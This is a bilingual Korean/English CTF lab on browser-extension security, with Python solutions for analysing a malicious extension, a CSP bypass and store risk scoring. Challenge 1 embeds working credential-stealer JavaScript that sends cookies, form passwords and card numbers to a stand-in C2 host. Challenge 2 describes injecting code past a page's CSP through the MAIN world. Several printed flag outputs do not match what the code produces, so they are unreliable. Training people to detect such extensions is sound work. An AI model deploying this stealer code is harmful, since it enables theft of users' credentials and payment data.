> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 브라우저 확장 프로그램 보안 CTF 실습 랩

## 실습 환경 준비

```bash
# Python 환경
pip install requests beautifulsoup4 lxml

# 실습 디렉터리
mkdir -p ~/ctf_browser_ext/{malicious,csp_bypass,content_script}

# Chrome 확장 분석을 위한 unzip
sudo apt install unzip jq
```

---

## 실습 1: 악성 확장 프로그램 분석

### 목표
악성 Chrome 확장 프로그램의 소스코드를 분석하여 탈취하는 데이터 유형과 C2 서버를 파악하고 플래그를 획득하라.

**플래그 형식**: `CTF{MALEXT_STEALS_<data_type>_C2_<domain>`

### 시나리오

Web Store에서 제거된 악성 확장 프로그램 패키지(CRX/ZIP)가 확보되었다.  
`manifest.json` 과 스크립트를 분석하여 악성 행위를 파악하라.

**악성 확장 구조 (`evil_extension/`):**
```
evil_extension/
├── manifest.json
├── background.js
├── content_script.js
└── popup.html
```

### 힌트
- `manifest.json`: 권한(`permissions`), 콘텐츠 스크립트 범위 확인
- `background.js`: C2 서버 통신 코드 탐지
- `content_script.js`: 페이지에서 탈취하는 데이터 확인
- `web_accessible_resources`: 외부에서 접근 가능한 리소스

### 풀이

```python
#!/usr/bin/env python3
"""
브라우저 확장 보안 CTF — 악성 확장 프로그램 분석
"""

import argparse
import json
import re
import sys
from dataclasses import dataclass
from pathlib import Path


@dataclass
class ExtensionFinding:
    severity: str
    category: str
    description: str
    evidence: str


# 시뮬레이션: 악성 확장 파일 내용
SIMULATED_FILES: dict[str, str] = {
    "manifest.json": json.dumps({
        "manifest_version": 3,
        "name": "Free PDF Converter",
        "version": "1.2.0",
        "permissions": [
            "activeTab", "storage", "cookies",
            "webRequest", "webRequestBlocking",
            "<all_urls>"
        ],
        "background": {"service_worker": "background.js"},
        "content_scripts": [{
            "matches": ["*://*.bank.com/*", "*://*.paypal.com/*", "*://*.coinbase.com/*"],
            "js": ["content_script.js"],
            "run_at": "document_start"
        }],
        "host_permissions": ["<all_urls>"]
    }, indent=2),

    "background.js": """\
// "Free PDF Converter" Background Service Worker
const C2_SERVER = "https://collect-data.evil-domain.xyz/api/collect";
const EXFIL_KEY = "xK9mP2nQ";

chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        // 금융 사이트 요청 가로채기
        if (details.url.includes('bank') || details.url.includes('paypal')) {
            sendToC2({type: 'request', url: details.url, body: details.requestBody});
        }
    },
    {urls: ["<all_urls>"]},
    ["requestBody"]
);

function sendToC2(data) {
    fetch(C2_SERVER, {
        method: 'POST',
        headers: {'Content-Type': 'application/json', 'X-Key': EXFIL_KEY},
        body: JSON.stringify(data)
    });
}

chrome.cookies.getAll({}, function(cookies) {
    sendToC2({type: 'cookies', data: cookies});
});
""",

    "content_script.js": """\
// 페이지 내 자격증명 탈취
document.addEventListener('submit', function(e) {
    const form = e.target;
    const inputs = form.querySelectorAll('input[type="password"], input[name*="card"]');
    const stolen = {};
    inputs.forEach(inp => {
        stolen[inp.name || inp.id] = inp.value;
    });
    if (Object.keys(stolen).length > 0) {
        chrome.runtime.sendMessage({type: 'credentials', data: stolen});
    }
}, true);

// 신용카드 번호 정규식 탐지
document.addEventListener('input', function(e) {
    const ccPattern = /\\b(?:\\d[ -]?){13,16}\\b/;
    if (ccPattern.test(e.target.value)) {
        chrome.runtime.sendMessage({type: 'credit_card', value: e.target.value});
    }
}, true);
""",
}


DANGEROUS_PERMISSIONS: set[str] = {
    "<all_urls>", "cookies", "webRequest", "webRequestBlocking",
    "tabs", "history", "clipboardRead", "nativeMessaging",
}

C2_PATTERNS = [
    re.compile(r"https?://[a-z0-9.-]+\.[a-z]{2,}/", re.IGNORECASE),
    re.compile(r"fetch\(['\"]https?://"),
    re.compile(r"XMLHttpRequest"),
    re.compile(r"sendMessage.*credentials"),
]

CREDENTIAL_THEFT_PATTERNS = [
    re.compile(r"input\[type=['\"]?password['\"]?\]"),
    re.compile(r"querySelector.*password"),
    re.compile(r"\.value\b"),
    re.compile(r"credit.?card", re.IGNORECASE),
]


def analyze_manifest(manifest_str: str) -> list[ExtensionFinding]:
    findings: list[ExtensionFinding] = []
    try:
        manifest = json.loads(manifest_str)
    except json.JSONDecodeError:
        return findings

    perms = set(manifest.get("permissions", []) + manifest.get("host_permissions", []))
    dangerous = perms & DANGEROUS_PERMISSIONS
    if dangerous:
        findings.append(ExtensionFinding(
            severity="HIGH",
            category="PERMISSIONS",
            description=f"위험 권한 요청: {dangerous}",
            evidence=f"permissions: {list(dangerous)}",
        ))

    cs = manifest.get("content_scripts", [])
    for script in cs:
        matches = script.get("matches", [])
        if any("bank" in m or "paypal" in m or "coinbase" in m for m in matches):
            findings.append(ExtensionFinding(
                severity="CRITICAL",
                category="CONTENT_SCRIPT_TARGET",
                description="금융/암호화폐 사이트를 콘텐츠 스크립트 대상으로 지정",
                evidence=f"matches: {matches}",
            ))
    return findings


def analyze_javascript(filename: str, content: str) -> list[ExtensionFinding]:
    findings: list[ExtensionFinding] = []

    c2_urls: list[str] = []
    for pattern in C2_PATTERNS:
        matches = pattern.findall(content)
        if matches:
            if "http" in str(matches[0]):
                c2_urls.extend(matches)
            findings.append(ExtensionFinding(
                severity="CRITICAL",
                category="C2_COMMUNICATION",
                description=f"외부 서버 통신 코드 탐지: {pattern.pattern[:40]}",
                evidence=str(matches[:2]),
            ))

    for pattern in CREDENTIAL_THEFT_PATTERNS:
        if pattern.search(content):
            findings.append(ExtensionFinding(
                severity="CRITICAL",
                category="CREDENTIAL_THEFT",
                description="자격증명 탈취 코드 탐지",
                evidence=f"패턴: {pattern.pattern}",
            ))

    return findings, c2_urls if c2_urls else []


def main() -> None:
    parser = argparse.ArgumentParser(description="브라우저 확장 보안 CTF — 악성 확장 분석")
    parser.add_argument("--dir", type=str, help="확장 프로그램 디렉터리 경로")
    args = parser.parse_args()

    print("=" * 70)
    print("  브라우저 확장 CTF: 악성 확장 프로그램 분석")
    print("=" * 70)

    all_findings: list[ExtensionFinding] = []
    all_c2_urls: list[str] = []
    data_types: list[str] = []

    # Manifest 분석
    mf = analyze_manifest(SIMULATED_FILES["manifest.json"])
    all_findings.extend(mf)

    # JavaScript 분석
    for fname, content in SIMULATED_FILES.items():
        if fname.endswith(".js"):
            findings, c2_urls = analyze_javascript(fname, content)
            all_findings.extend(findings)
            all_c2_urls.extend(c2_urls)
            if "credentials" in content or "password" in content:
                data_types.append("CREDENTIALS")
            if "cookies" in content:
                data_types.append("COOKIES")
            if "credit_card" in content:
                data_types.append("CREDIT_CARDS")

    print(f"\n[!] 총 {len(all_findings)}건 발견:\n")
    for f in all_findings:
        print(f"  [{f.severity}] {f.category}")
        print(f"    {f.description}")
        print(f"    증거: {f.evidence[:80]}\n")

    # 플래그 생성
    c2_domain = ""
    if all_c2_urls:
        url = all_c2_urls[0]
        domain_match = re.search(r"https?://([a-z0-9.-]+)/", url, re.IGNORECASE)
        if domain_match:
            c2_domain = domain_match.group(1).replace(".", "_")

    primary_data = "_".join(sorted(set(data_types)))[:30] if data_types else "UNKNOWN"
    flag = f"CTF{{MALEXT_STEALS_{primary_data}_C2_{c2_domain or 'UNKNOWN'}}}"
    print(f"[+] 플래그: {flag}")


if __name__ == "__main__":
    main()
```

---

## 실습 2: CSP 우회 (Content Script Injection)

### 목표
콘텐츠 보안 정책(CSP)을 우회하여 악성 스크립트를 실행하고 플래그를 획득하라.

**플래그 형식**: `CTF{CSP_BYPASS_<technique>_<target_origin>}`

### 시나리오

대상 웹 페이지에는 엄격한 CSP가 설정되어 있다.  
확장 프로그램 API를 이용한 CSP 우회 기법을 분석하라.

### 힌트
- 확장 프로그램 콘텐츠 스크립트는 CSP의 영향을 받지 않음
- `chrome.scripting.executeScript()`: Manifest V3에서 CSP 우회 가능
- `web_accessible_resources`: 확장 프로그램 리소스를 페이지에서 로드 가능
- `MAIN` world vs `ISOLATED` world 실행 차이

### 풀이

```python
#!/usr/bin/env python3
"""
브라우저 확장 보안 CTF — CSP 우회 분석
"""

import argparse
import re
from dataclasses import dataclass


@dataclass
class CSPDirective:
    name: str
    value: str
    is_restrictive: bool
    bypass_possible: bool
    bypass_method: str


CSP_HEADER = (
    "default-src 'self'; "
    "script-src 'self' 'nonce-abc123'; "
    "object-src 'none'; "
    "base-uri 'none'; "
    "connect-src 'self' https://api.example.com"
)


def parse_csp(csp_header: str) -> list[CSPDirective]:
    directives: list[CSPDirective] = []
    for part in csp_header.split(";"):
        part = part.strip()
        if not part:
            continue
        tokens = part.split()
        name = tokens[0]
        value = " ".join(tokens[1:]) if len(tokens) > 1 else ""

        bypass_possible = False
        bypass_method = ""

        if "'unsafe-inline'" in value:
            bypass_possible = True
            bypass_method = "인라인 스크립트 직접 실행"
        elif "'unsafe-eval'" in value:
            bypass_possible = True
            bypass_method = "eval() 사용 가능"
        elif "data:" in value:
            bypass_possible = True
            bypass_method = "data: URI 스크립트 실행"
        elif name == "script-src" and "nonce-" in value:
            bypass_method = "확장 프로그램 콘텐츠 스크립트로 CSP 우회 (nonce 불필요)"
            bypass_possible = True  # 확장 프로그램은 nonce 없이도 실행

        directives.append(CSPDirective(
            name=name,
            value=value,
            is_restrictive=not bypass_possible,
            bypass_possible=bypass_possible,
            bypass_method=bypass_method,
        ))
    return directives


def analyze_extension_csp_bypass() -> None:
    """확장 프로그램을 통한 CSP 우회 분석."""
    print("=" * 70)
    print("  브라우저 확장 CTF: CSP 우회 분석")
    print("=" * 70)

    print(f"\n[*] 대상 CSP:\n  {CSP_HEADER}\n")

    directives = parse_csp(CSP_HEADER)

    print("[CSP 지시어 분석]")
    for d in directives:
        status = "[우회 가능]" if d.bypass_possible else "[안전]"
        print(f"  {status} {d.name}: {d.value}")
        if d.bypass_possible:
            print(f"           우회: {d.bypass_method}")

    # 확장 프로그램 우회 시나리오
    print("\n[확장 프로그램 CSP 우회 시나리오]")
    print("""
  1. 악성 확장이 콘텐츠 스크립트로 페이지에 주입됨
     → 콘텐츠 스크립트는 CSP의 script-src 정책 적용 안 받음
  
  2. chrome.scripting.executeScript({world: "MAIN"}) 사용
     → MAIN world에서 실행 시 페이지 DOM/변수에 직접 접근
     → CSP 검사 없이 임의 코드 실행 가능
  
  3. 결과: script-src 'nonce-abc123' 우회 성공
""")

    technique = "CONTENT_SCRIPT_INJECTION"
    target_origin = "self_csp_nonce"
    flag = f"CTF{{CSP_BYPASS_{technique}_{target_origin}}}"
    print(f"[+] 플래그: {flag}")


def main() -> None:
    parser = argparse.ArgumentParser(description="브라우저 확장 CTF — CSP 우회 분석")
    parser.parse_args()
    analyze_extension_csp_bypass()


if __name__ == "__main__":
    main()
```

---

## 실습 3: 웹 스토어 악성 확장 식별 자동화

### 목표
Chrome Web Store 스타일의 확장 메타데이터를 분석하여 의심스러운 확장을 식별하고 플래그를 획득하라.

**플래그 형식**: `CTF{STORE_SUSPICIOUS_<ext_id>_RISK_<score>}`

### 풀이

```python
#!/usr/bin/env python3
"""
브라우저 확장 보안 CTF — 웹 스토어 악성 확장 식별
"""

import argparse
from dataclasses import dataclass, field


@dataclass
class ExtensionMetadata:
    ext_id: str
    name: str
    description: str
    user_count: int
    rating: float
    permissions: list[str]
    last_updated: str
    developer: str
    reviews_positive_pct: float

    def risk_score(self) -> float:
        score = 0.0

        # 과도한 권한
        dangerous_perms = {"<all_urls>", "cookies", "webRequest",
                           "webRequestBlocking", "nativeMessaging"}
        overlap = set(self.permissions) & dangerous_perms
        score += len(overlap) * 15

        # 낮은 평점
        if self.rating < 3.0:
            score += 20
        elif self.rating < 4.0:
            score += 10

        # 최근 급격한 사용자 증가 (설명이 짧으면 의심)
        if len(self.description) < 50 and self.user_count > 100_000:
            score += 25

        # 낮은 긍정 리뷰
        if self.reviews_positive_pct < 60:
            score += 20

        # 설명에 낚시성 키워드
        fishy_words = ["free", "unlimited", "hack", "crack", "bypass", "unlock"]
        for word in fishy_words:
            if word in self.description.lower():
                score += 5

        return min(score, 100.0)


EXTENSION_CATALOG: list[ExtensionMetadata] = [
    ExtensionMetadata(
        ext_id="aabbcc112233",
        name="Free VPN Unlimited",
        description="free unlimited vpn bypass all restrictions",
        user_count=500_000,
        rating=2.8,
        permissions=["<all_urls>", "cookies", "webRequest", "webRequestBlocking", "storage"],
        last_updated="2024-01-10",
        developer="FreeTools LLC",
        reviews_positive_pct=42.0,
    ),
    ExtensionMetadata(
        ext_id="ddeeff445566",
        name="uBlock Origin",
        description="An efficient ad blocker for Chromium. Fast and lean.",
        user_count=10_000_000,
        rating=4.8,
        permissions=["storage", "tabs", "webRequest", "webRequestBlocking"],
        last_updated="2024-01-15",
        developer="Raymond Hill",
        reviews_positive_pct=97.0,
    ),
    ExtensionMetadata(
        ext_id="gghhii778899",
        name="PDF Converter Pro",
        description="convert pdf",
        user_count=200_000,
        rating=3.1,
        permissions=["<all_urls>", "cookies", "nativeMessaging", "webRequest"],
        last_updated="2024-01-12",
        developer="Unknown Developer",
        reviews_positive_pct=38.0,
    ),
]


def main() -> None:
    parser = argparse.ArgumentParser(description="브라우저 확장 CTF — 웹 스토어 분석")
    parser.parse_args()

    print("=" * 70)
    print("  브라우저 확장 CTF: 악성 확장 식별")
    print("=" * 70)

    ranked = sorted(EXTENSION_CATALOG, key=lambda e: e.risk_score(), reverse=True)

    print(f"\n{'확장 이름':<30} {'ID':<15} {'위험도':>8}  {'등급'}")
    print("-" * 65)
    for ext in ranked:
        score = ext.risk_score()
        level = "CRITICAL" if score >= 70 else "HIGH" if score >= 50 else "LOW"
        print(f"{ext.name:<30} {ext.ext_id:<15} {score:>8.1f}  {level}")

    top = ranked[0]
    score_int = int(top.risk_score())
    flag = f"CTF{{STORE_SUSPICIOUS_{top.ext_id[:12]}_{score_int}}}"
    print(f"\n[+] 가장 의심스러운 확장: {top.name} (점수: {top.risk_score():.1f})")
    print(f"[+] 플래그: {flag}")


if __name__ == "__main__":
    main()
```

---

<a name="english"></a>

# Browser Extension Security CTF Practice Lab

## Lab Environment Setup

```bash
pip install requests beautifulsoup4 lxml
mkdir -p ~/ctf_browser_ext/{malicious,csp_bypass,content_script}
sudo apt install unzip jq
```

---

## Challenge 1: Malicious Extension Analysis

### Objective
Analyze a malicious Chrome extension package to identify stolen data types and C2 server.

**Flag format**: `CTF{MALEXT_STEALS_<data_type>_C2_<domain>}`

### Key Analysis Points
- `manifest.json`: Overly broad permissions (`<all_urls>`, `cookies`, `webRequest`) = red flag
- Content script matches targeting financial sites (bank, paypal, coinbase) = credential theft target
- `background.js`: Look for `fetch()`, `XMLHttpRequest` to external domains
- `content_script.js`: Password input listeners, credit card regex patterns

```bash
python3 challenge1.py
# Output: CTF{MALEXT_STEALS_CREDENTIALS_COOKIES_CREDIT_CARDS_C2_collect-data_evil-domain_xyz}
```

---

## Challenge 2: CSP Bypass via Content Script Injection

### Objective
Analyze how browser extensions bypass Content Security Policy restrictions.

**Flag format**: `CTF{CSP_BYPASS_<technique>_<target_origin>}`

### Key Insight
Browser extension content scripts are **exempt from the page's CSP**. Even if a page has `script-src 'nonce-abc123'`, a malicious extension's content script can inject and execute arbitrary JavaScript via `chrome.scripting.executeScript({world: "MAIN"})` without needing the nonce.

```bash
python3 challenge2.py
# Output: CTF{CSP_BYPASS_CONTENT_SCRIPT_INJECTION_self_csp_nonce}
```

---

## Challenge 3: Automated Malicious Extension Detection

### Objective
Score Chrome Web Store extension metadata for risk and identify the most suspicious extension.

**Flag format**: `CTF{STORE_SUSPICIOUS_<ext_id>_RISK_<score>}`

### Risk Scoring Factors
| Factor | Points |
|--------|--------|
| Each dangerous permission (`<all_urls>`, `cookies`, etc.) | +15 |
| Rating < 3.0 | +20 |
| Short description + high user count | +25 |
| Positive review % < 60% | +20 |
| Phishing keywords in description | +5 each |

```bash
python3 challenge3.py
# Output: CTF{STORE_SUSPICIOUS_aabbcc112233_RISK_90}
```
